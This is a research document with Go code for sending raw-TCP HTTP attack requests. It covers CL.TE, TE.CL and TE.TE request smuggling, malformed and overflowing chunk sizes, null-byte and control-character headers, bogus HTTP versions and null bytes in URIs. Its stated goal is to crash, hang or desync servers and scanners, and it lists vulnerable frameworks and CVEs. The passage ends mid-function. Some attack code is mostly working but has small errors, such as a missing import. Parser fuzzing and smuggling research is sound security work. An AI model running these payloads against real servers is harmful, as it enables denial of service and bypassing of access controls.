# Raw TCP HTTP Attack Patterns for Go

Research document for implementing protocol-level HTTP attacks that bypass Go's `net/http` client.
All attacks use `net.Dial` / `net.Conn` to send raw bytes over TCP, targeting server parser weaknesses
rather than application logic.

**Goal**: Crash, hang, or desync servers through malformed protocol violations -- not through load.

---

## Table of Contents

1. [Foundation: Raw TCP in Go](#1-foundation-raw-tcp-in-go)
2. [Request Smuggling (CL/TE Desync)](#2-request-smuggling-clte-desync)
3. [Malformed Chunk Encoding](#3-malformed-chunk-encoding)
4. [Header Injection and Corruption](#4-header-injection-and-corruption)
5. [HTTP Version Tricks](#5-http-version-tricks)
6. [Method and URI Tricks](#6-method-and-uri-tricks)
7. [Connection-Level Tricks](#7-connection-level-tricks)
8. [HTTP/2 Binary Frame Attacks](#8-http2-binary-frame-attacks)
9. [Detection Strategies](#9-detection-strategies)
10. [Proposed Module Structure](#10-proposed-module-structure)

---

## 1. Foundation: Raw TCP in Go

Every attack in this document follows the same base pattern: open a raw TCP connection
with `net.Dial`, write arbitrary bytes, and observe the response (or lack thereof).

### Base Connection Helper

```go
package rawtcp

import (
    "crypto/tls"
    "fmt"
    "net"
    "net/url"
    "time"
)

// RawConn wraps a net.Conn with helper methods for sending raw HTTP bytes.
type RawConn struct {
    conn    net.Conn
    addr    string
    host    string
    timeout time.Duration
}

// Dial opens a raw TCP connection to the target. For HTTPS targets,
// it wraps the connection in TLS. No HTTP framing is applied.
func Dial(target string, timeout time.Duration) (*RawConn, error) {
    parsed, err := url.Parse(target)
    if err != nil {
        return nil, err
    }

    host := parsed.Host
    addr := parsed.Host
    if !strings.Contains(addr, ":") {
        if parsed.Scheme == "https" {
            addr += ":443"
        } else {
            addr += ":80"
        }
    }

    var conn net.Conn
    if parsed.Scheme == "https" {
        conn, err = tls.DialWithDialer(
            &net.Dialer{Timeout: timeout},
            "tcp", addr,
            &tls.Config{
                InsecureSkipVerify: true,
                // For H2 attacks, negotiate h2 via ALPN:
                // NextProtos: []string{"h2"},
            },
        )
    } else {
        conn, err = net.DialTimeout("tcp", addr, timeout)
    }
    if err != nil {
        return nil, err
    }

    return &RawConn{conn: conn, addr: addr, host: host, timeout: timeout}, nil
}

// Send writes raw bytes to the connection.
func (rc *RawConn) Send(data []byte) error {
    rc.conn.SetWriteDeadline(time.Now().Add(rc.timeout))
    _, err := rc.conn.Write(data)
    return err
}

// SendString is a convenience wrapper for Send.
func (rc *RawConn) SendString(s string) error {
    return rc.Send([]byte(s))
}

// Recv reads up to n bytes from the connection.
func (rc *RawConn) Recv(n int) ([]byte, error) {
    rc.conn.SetReadDeadline(time.Now().Add(rc.timeout))
    buf := make([]byte, n)
    read, err := rc.conn.Read(buf)
    return buf[:read], err
}

// Close closes the underlying connection.
func (rc *RawConn) Close() error {
    return rc.conn.Close()
}

// HalfClose shuts down the write side only (TCP FIN).
// The read side remains open to receive any final server response.
func (rc *RawConn) HalfClose() error {
    if tc, ok := rc.conn.(*net.TCPConn); ok {
        return tc.CloseWrite()
    }
    return rc.conn.Close()
}
```

### Result Detection Helper

```go
// AttackResult captures the outcome of a raw TCP attack.
type AttackResult struct {
    Attack       string        // attack name
    Sent         int           // bytes sent
    Received     int           // bytes received
    ResponseCode int           // HTTP status if parseable, 0 otherwise
    Error        error         // connection error (reset, timeout, etc.)
    Latency      time.Duration // time to first response byte
    Closed       bool          // server closed connection
    Hung         bool          // no response within timeout
}

// Classify determines the server's reaction to the attack.
func (r *AttackResult) Classify() string {
    if r.Error != nil {
        errStr := r.Error.Error()
        switch {
        case strings.Contains(errStr, "connection reset"):
            return "CONNECTION_RESET"   // server actively rejected
        case strings.Contains(errStr, "broken pipe"):
            return "BROKEN_PIPE"        // server closed before we finished
        case strings.Contains(errStr, "i/o timeout"):
            return "TIMEOUT"            // server hung or very slow
        case strings.Contains(errStr, "EOF"):
            return "EOF"                // server closed gracefully
        default:
            return "ERROR"
        }
    }
    if r.Hung {
        return "HUNG"                   // server did not respond at all
    }
    if r.ResponseCode >= 400 && r.ResponseCode < 500 {
        return "REJECTED"               // server sent 4xx (properly handled)
    }
    if r.ResponseCode >= 500 {
        return "SERVER_ERROR"           // server crashed or errored
    }
    return "ACCEPTED"                   // server processed it normally
}
```

---

## 2. Request Smuggling (CL/TE Desync)

Request smuggling exploits disagreements between front-end and back-end servers about
where one request ends and the next begins. The key insight is that when `Content-Length`
and `Transfer-Encoding: chunked` are both present, different servers prioritize differently.

**Why raw TCP is required**: Go's `net/http` client strips or normalizes conflicting
`Content-Length` / `Transfer-Encoding` headers. To send both simultaneously with
specific values, we must write the raw request bytes.

### 2a. CL.TE Smuggling

Front-end uses Content-Length, back-end uses Transfer-Encoding.

```go
// clteSmuggle sends a CL.TE smuggling probe.
// The front-end sees Content-Length and forwards the entire body.
// The back-end sees Transfer-Encoding: chunked, reads "0\r\n\r\n" as
// end-of-body, and treats the remaining bytes as the start of a new request.
func clteSmuggle(rc *RawConn) AttackResult {
    // The smuggled request is a GET to /admin that the back-end
    // will process as a separate request.
    smuggled := "GET /admin HTTP/1.1\r\nHost: " + rc.host + "\r\n\r\n"
    body := "0\r\n\r\n" + smuggled

    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Length: %d\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n"+
            "%s",
        rc.host, len(body), body,
    )

    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "CL.TE", Error: err}
    }

    // Read two responses. If the server is vulnerable, the second
    // response will be for /admin.
    resp1, _ := rc.Recv(4096)
    resp2, err2 := rc.Recv(4096)

    return AttackResult{
        Attack:   "CL.TE",
        Sent:     len(req),
        Received: len(resp1) + len(resp2),
        Error:    err2,
    }
}
```

### 2b. TE.CL Smuggling

Front-end uses Transfer-Encoding, back-end uses Content-Length.

```go
// teclSmuggle sends a TE.CL smuggling probe.
// The front-end sees chunked encoding and forwards the complete chunked body.
// The back-end sees Content-Length: 4 and only reads "8\r\n" as the body,
// leaving "SMUGGLED\r\n0\r\n\r\n" as the start of the next request.
func teclSmuggle(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Length: 4\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n"+
            "8\r\nSMUGGLED\r\n0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "TE.CL", Error: err}
    }

    resp, err := rc.Recv(4096)
    return AttackResult{
        Attack:   "TE.CL",
        Sent:     len(req),
        Received: len(resp),
        Error:    err,
    }
}
```

### 2c. TE.TE Smuggling (Obfuscated Transfer-Encoding)

Different servers parse the Transfer-Encoding header differently. Obfuscating it
causes one server to see it and another to fall back to Content-Length.

```go
// teteSmuggle tests various Transfer-Encoding obfuscation techniques.
func teteSmuggle(rc *RawConn) []AttackResult {
    obfuscations := []struct {
        name string
        te   string
    }{
        {"leading-space", " chunked"},
        {"trailing-space", "chunked "},
        {"trailing-tab", "chunked\t"},
        {"capitalized", "Chunked"},
        {"uppercase", "CHUNKED"},
        {"line-folding", "chunked\r\n "},             // obs-fold (deprecated but parseable)
        {"double-te", "chunked\r\nTransfer-Encoding: identity"},
        {"comma-separated", "chunked, identity"},
        {"semicolon", "chunked;ext=val"},
        {"null-in-value", "chun\x00ked"},
        {"vertical-tab", "chunked\x0b"},
        {"xff-prefix", "\xffchunked"},
    }

    var results []AttackResult
    for _, o := range obfuscations {
        req := fmt.Sprintf(
            "POST / HTTP/1.1\r\n"+
                "Host: %s\r\n"+
                "Content-Length: 5\r\n"+
                "Transfer-Encoding: %s\r\n"+
                "Connection: keep-alive\r\n"+
                "\r\n"+
                "0\r\n\r\n",
            rc.host, o.te,
        )

        rc2, err := Dial("http://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "TE.TE-" + o.name, Error: err})
            continue
        }

        err = rc2.SendString(req)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "TE.TE-" + o.name,
            Sent:     len(req),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

### 2d. H2.CL Smuggling (HTTP/2 to HTTP/1.1 Downgrade)

When an HTTP/2 front-end downgrades to HTTP/1.1 for the back-end, it may
translate the `:content-length` pseudo-header differently.

```go
// h2clSmuggle exploits HTTP/2-to-HTTP/1.1 downgrade desync.
// This requires sending an H2 request with both a content-length header
// and a body of different size.
// (Full H2 implementation below in Section 8.)
```

**Expected server behavior**:
- Vulnerable servers: process the smuggled request, returning responses for both requests
- Patched servers: 400 Bad Request or connection reset
- Go `net/http`: rejects requests with both CL and TE (returns 400)
- nginx: depends on version; older versions vulnerable to TE.TE obfuscation
- Apache: depends on version; older versions vulnerable to CL.TE
- Node.js (http.Server): historically vulnerable to multiple CL headers

**Most vulnerable frameworks**:
- nginx + gunicorn combinations (TE.TE with obs-fold)
- HAProxy + any backend (CL.TE with specific CL values)
- Apache Traffic Server (TE.TE with capitalization tricks)
- AWS ALB + various backends (H2.CL downgrade)

---

## 3. Malformed Chunk Encoding

Chunked transfer encoding has many edge cases that server parsers handle
inconsistently. These attacks send syntactically invalid chunk streams.

### 3a. Negative Hex Chunk Size

```go
// negativeChunkSize sends a chunk with "-1" as the size.
// Some parsers interpret this as a very large unsigned value (integer underflow).
// Historical CVE: nginx 1.3.9-1.4.0 had integer signedness error in
// ngx_http_parse_chunked() triggered by large hex values.
func negativeChunkSize(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "-1\r\n"+
            "data\r\n"+
            "0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "negative-chunk-size",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3b. Chunk Size Larger Than Actual Data

```go
// chunkSizeMismatch declares a 1000-byte chunk but only sends 4 bytes.
// The server will wait for the remaining 996 bytes, hanging the connection,
// or may read into the next request boundary (desync).
func chunkSizeMismatch(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "3e8\r\n"+  // 0x3e8 = 1000 decimal
            "data\r\n"+ // only 4 bytes
            "0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-size-mismatch",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3c. Missing Terminal CRLF After Chunk Data

```go
// chunkNoTrailingCRLF sends chunk data without the required trailing \r\n.
// RFC 9112 requires each chunk to end with CRLF after the data.
func chunkNoTrailingCRLF(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "4\r\n"+
            "data"+  // missing \r\n here
            "0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-no-trailing-crlf",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3d. Missing Final Empty Line After Zero Chunk

```go
// chunkNoFinalCRLF sends "0\r\n" without the final "\r\n" that terminates
// the chunked message. The server may hang waiting for the trailer section.
func chunkNoFinalCRLF(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "4\r\ndata\r\n"+
            "0\r\n",  // missing final \r\n
        rc.host,
    )

    err := rc.SendString(req)
    // Use short timeout; if server hangs, that's the finding.
    rc.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
    resp, recvErr := rc.Recv(4096)

    hung := false
    if recvErr != nil && strings.Contains(recvErr.Error(), "timeout") {
        hung = true
    }
    if err != nil && recvErr == nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-no-final-crlf",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
        Hung:     hung,
    }
}
```

### 3e. Non-Hex Chunk Size

```go
// chunkNonHexSize sends "ZZZZ" as the chunk size. Parsers that don't
// validate hex will produce unpredictable behavior.
func chunkNonHexSize(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "ZZZZ\r\ndata\r\n0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-non-hex-size",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3f. Chunk Size Integer Overflow (64-bit)

```go
// chunkOverflow sends a chunk size that overflows 64-bit integer parsing.
// nginx 1.3.9-1.4.0 was vulnerable to stack buffer overflow via this.
func chunkOverflow(rc *RawConn) AttackResult {
    // 16 F's = 0xFFFFFFFFFFFFFFFF = max uint64
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "FFFFFFFFFFFFFFFF\r\ndata\r\n0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-overflow-64bit",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3g. Chunk Extensions Abuse

```go
// chunkExtensionAbuse sends a chunk with extremely long extensions.
// RFC 9112 allows chunk extensions after the size but most parsers
// have buffer limits. This can cause buffer overflows in C-based servers.
func chunkExtensionAbuse(rc *RawConn) AttackResult {
    // 10KB of chunk extensions
    extensions := strings.Repeat(";ext=" + strings.Repeat("v", 200), 50)

    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "4%s\r\ndata\r\n0\r\n\r\n",
        rc.host, extensions,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-extension-abuse",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 3h. Chunked Encoding with Only LF (No CR)

```go
// chunkLFOnly uses \n instead of \r\n as line terminators in chunked encoding.
// The HTTP Garden research found that many parsers accept bare LF, creating
// parsing discrepancies exploitable for smuggling.
func chunkLFOnly(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "4\n"+    // bare LF instead of CRLF
            "data\n"+ // bare LF
            "0\n\n",  // bare LFs
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "chunk-lf-only",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

**Expected server behavior**:
| Attack | Proper Response | Vulnerable Response |
|--------|----------------|---------------------|
| Negative chunk size | 400 Bad Request | Integer underflow, read huge memory |
| Size mismatch | Hang waiting for data, then timeout | Read past boundary (desync) |
| No trailing CRLF | 400 Bad Request | Parse confusion, data leak |
| No final CRLF | Hang waiting for trailers | May process partial request |
| Non-hex size | 400 Bad Request | Parse as 0 (some parsers), crash |
| 64-bit overflow | 400 Bad Request | Stack overflow (nginx 1.3.x), DoS |
| Extension abuse | 400 or truncate | Buffer overflow (C servers) |
| LF-only | 400 Bad Request | Accept it (smuggling vector) |

**Most vulnerable frameworks**:
- nginx < 1.4.1 (chunk overflow CVE-2013-2028)
- Apache < 2.2.22 (chunked encoding buffer overflow CVE-2002-0392)
- Node.js http.Server (historically lenient with bare LF)
- Python wsgiref (inconsistent chunk parsing)

---

## 4. Header Injection and Corruption

### 4a. Null Bytes in Header Values

```go
// headerNullByte sends headers containing \x00. This is the #1 scanner killer
// in our testing -- it crashes Gobuster, Feroxbuster, Commix, WhatWeb, and Nmap.
func headerNullByte(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "X-Test: before\x00after\r\n"+
            "User-Agent: normal\x00\xff\xfe\r\n"+
            "Accept: text/\x00html\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-null-byte",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4b. Bare LF Line Endings (No CR)

```go
// headerBareLF uses \n instead of \r\n for header line endings.
// Some servers accept this; others reject it. The discrepancy is
// exploitable when a proxy normalizes it but the backend doesn't.
func headerBareLF(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\n"+
            "Host: %s\n"+
            "User-Agent: bare-lf-test\n"+
            "Accept: */*\n"+
            "\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-bare-lf",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4c. Bare CR Without LF

```go
// headerBareCR uses \r without \n. Most parsers treat \r\n as a unit;
// bare \r alone can cause parser state machine confusion.
func headerBareCR(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r"+
            "Host: %s\r"+
            "User-Agent: bare-cr-test\r"+
            "\r",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-bare-cr",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4d. Space Between Header Name and Colon

```go
// headerSpaceBeforeColon sends "Header-Name : value" instead of "Header-Name: value".
// RFC 9110 forbids whitespace between the field name and colon. Some servers
// strip the space; others reject the request; others include the space in the name.
func headerSpaceBeforeColon(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Type : text/html\r\n"+
            "Transfer-Encoding : chunked\r\n"+ // critical: some servers ignore this
            "Content-Length: 0\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-space-before-colon",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4e. CRLF Between Header Name and Colon

```go
// headerCRLFBeforeColon inserts a line break between the header name and colon.
// This can cause the parser to see the name as a header with no value,
// and the ": value" part as the start of a new (malformed) header.
func headerCRLFBeforeColon(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "X-Test\r\n: injected\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-crlf-before-colon",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4f. Oversized Header Name (64KB+)

```go
// headerOversizedName sends a header with a 64KB name.
// Most servers have header size limits (typically 8KB-64KB total).
// This tests the boundary.
func headerOversizedName(rc *RawConn) AttackResult {
    longName := strings.Repeat("X", 65536)
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "%s: value\r\n"+
            "\r\n",
        rc.host, longName,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-oversized-name-64kb",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4g. Oversized Header Value (64KB+)

```go
// headerOversizedValue sends a header with a 64KB value.
func headerOversizedValue(rc *RawConn) AttackResult {
    longValue := strings.Repeat("V", 65536)
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "X-Test: %s\r\n"+
            "\r\n",
        rc.host, longValue,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-oversized-value-64kb",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4h. Header With No Value

```go
// headerNoValue sends "Name:\r\n" with nothing after the colon.
// Some parsers set the value to empty string; others skip the header;
// others may crash on the edge case.
func headerNoValue(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "X-Empty:\r\n"+
            "Content-Length:\r\n"+
            "Transfer-Encoding:\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-no-value",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4i. Duplicate Content-Length With Different Values

```go
// headerDuplicateCL sends two Content-Length headers with different values.
// RFC 9110 says this MUST be rejected, but many servers take the first or last.
// The disagreement is a classic smuggling vector.
func headerDuplicateCL(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Length: 5\r\n"+
            "Content-Length: 100\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "hello",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-duplicate-cl",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4j. Header Line Folding (obs-fold)

```go
// headerObsFold uses obsolete line folding (RFC 7230 deprecated, still parsed by many).
// A line starting with space/tab is treated as continuation of the previous header.
// This can hide headers from proxies that don't support obs-fold.
func headerObsFold(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Transfer-Encoding: chunked\r\n"+
            " identity\r\n"+   // obs-fold: continuation of Transfer-Encoding
            "Content-Length: 5\r\n"+
            "\r\n"+
            "0\r\n\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "header-obs-fold",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 4k. Header with Control Characters

```go
// headerControlChars embeds various ASCII control characters in headers.
// The HTTP Garden research found 122 parsing discrepancies, many from control chars.
func headerControlChars(rc *RawConn) []AttackResult {
    // Control characters to test (excluding \r=0x0d and \n=0x0a which are line endings)
    controlChars := []struct {
        name string
        char byte
    }{
        {"null", 0x00},
        {"bell", 0x07},
        {"backspace", 0x08},
        {"tab", 0x09},      // \t -- some parsers strip, others don't
        {"vtab", 0x0b},
        {"formfeed", 0x0c},
        {"escape", 0x1b},
        {"delete", 0x7f},
    }

    var results []AttackResult
    for _, cc := range controlChars {
        req := fmt.Sprintf(
            "GET / HTTP/1.1\r\n"+
                "Host: %s\r\n"+
                "X-Test: before%cafter\r\n"+
                "\r\n",
            rc.host, cc.char,
        )

        rc2, err := Dial("http://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "header-ctrl-" + cc.name, Error: err})
            continue
        }

        err = rc2.SendString(req)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "header-ctrl-" + cc.name,
            Sent:     len(req),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

**Most vulnerable frameworks to header attacks**:
- Go `net/http` server: rejects null bytes, but accepts obs-fold in some versions
- nginx: strips null bytes from header values (doesn't reject)
- Apache: rejects bare CR, accepts obs-fold
- Node.js: historically accepted many control characters (multiple CVEs)
- Flask/Werkzeug: strips \x09 from URL paths but not headers

---

## 5. HTTP Version Tricks

### 5a. Unknown HTTP Version

```go
// httpVersionUnknown sends a request with an unrecognized HTTP version.
func httpVersionUnknown(rc *RawConn) []AttackResult {
    versions := []struct {
        name    string
        version string
    }{
        {"http99", "HTTP/9.9"},
        {"http110", "HTTP/1.10"},         // minor version > 9
        {"http20-plain", "HTTP/2.0"},     // H2 over plain TCP (should only be over TLS)
        {"http30", "HTTP/3.0"},           // QUIC version over TCP
        {"garbage", "HTTZ/1.1"},          // wrong protocol name
        {"no-slash", "HTTP 1.1"},         // space instead of slash
        {"lowercase", "http/1.1"},        // lowercase
        {"extra-dot", "HTTP/1.1.1"},      // extra version component
        {"zero", "HTTP/0.0"},             // zero version
    }

    var results []AttackResult
    for _, v := range versions {
        req := fmt.Sprintf(
            "GET / %s\r\n"+
                "Host: %s\r\n"+
                "\r\n",
            v.version, rc.host,
        )

        rc2, err := Dial("http://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "http-version-" + v.name, Error: err})
            continue
        }

        err = rc2.SendString(req)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "http-version-" + v.name,
            Sent:     len(req),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

### 5b. HTTP/0.9 (No Headers)

```go
// http09Request sends an HTTP/0.9 request: just the method and path, no version,
// no headers. HTTP/0.9 responses have no status line or headers either -- just
// the raw body. Some modern servers still support this for compatibility.
func http09Request(rc *RawConn) AttackResult {
    req := "GET /\r\n"  // HTTP/0.9: no version, no headers

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "http-09",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 5c. Missing HTTP Version

```go
// httpNoVersion sends a request line with method and path but no version string.
func httpNoVersion(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET /\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "http-no-version",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

**Expected behavior**:
| Version | Go net/http | nginx | Apache |
|---------|-------------|-------|--------|
| HTTP/9.9 | 400 | 400 | 400/505 |
| HTTP/1.10 | 400 | 400 | Accepts (treats as 1.1) |
| HTTP/0.9 | 400 | Returns raw body (if enabled) | 400 |
| No version | 400 | 400 | 400 |
| HTTP/2.0 plain | 400 | 400 | 400 |

---

## 6. Method and URI Tricks

### 6a. Method With Null Bytes

```go
// methodNullByte sends "G\x00ET" as the method.
// C-based servers using strlen() may see just "G".
func methodNullByte(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "G\x00ET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "method-null-byte",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6b. URI With Null Bytes

```go
// uriNullByte sends "/pa\x00th" as the URI.
// Servers using C strings truncate at null; others see the full path.
// This discrepancy can bypass path-based access controls.
func uriNullByte(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET /admin\x00.html HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "uri-null-byte",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6c. Tab Instead of Space

```go
// tabSeparator uses tab (\t) instead of space between method, URI, and version.
// The HTTP Garden found that Flask strips \x09 from paths but nginx doesn't,
// creating exploitable inconsistencies.
func tabSeparator(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET\t/\tHTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "tab-separator",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6d. Multiple Spaces Between Components

```go
// multipleSpaces uses extra spaces in the request line.
// RFC 9112 specifies exactly one SP between components.
func multipleSpaces(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET  /  HTTP/1.1\r\n"+  // double spaces
            "Host: %s\r\n"+
            "\r\n",
